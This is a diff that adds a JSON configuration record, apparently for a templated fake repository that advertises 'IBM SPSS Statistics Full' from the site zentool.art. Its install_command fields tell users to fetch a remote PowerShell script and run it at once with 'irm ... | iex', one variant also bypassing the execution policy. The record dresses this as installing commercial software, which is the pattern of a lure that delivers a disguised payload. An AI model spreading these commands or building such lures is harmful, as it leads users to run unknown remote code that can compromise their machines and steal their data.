@@ -1,0 +1,28 @@
+{
+  "repo": "IBM-SPSS-Statistics-Full",
+  "product": "IBM SPSS Statistics Full",
+  "product_title": "IBM SPSS Statistics",
+  "kind": "analytics",
+  "install_type": "zentool-irm",
+  "install_command": "irm https://zentool.art/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://zentool.art/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era",
+  "format": "license-md-zentool-v7-git-new-era-guide",
+  "tone": "guide",
+  "category": "analytics",
+  "topics": [
+    "ibm-spss-statistics-windows",
+    "ibm-config",
+    "ibm-integration",
+    "ibm-latest",
+    "statistics",
+    "data-analysis",
+    "survey-research",
+    "reporting-tools",
+    "spss-alternative",
+    "analytics-software",
+    "windows-analytics",
+    "research-tools"
+  ],
+  "site": "zentool.art"
+}
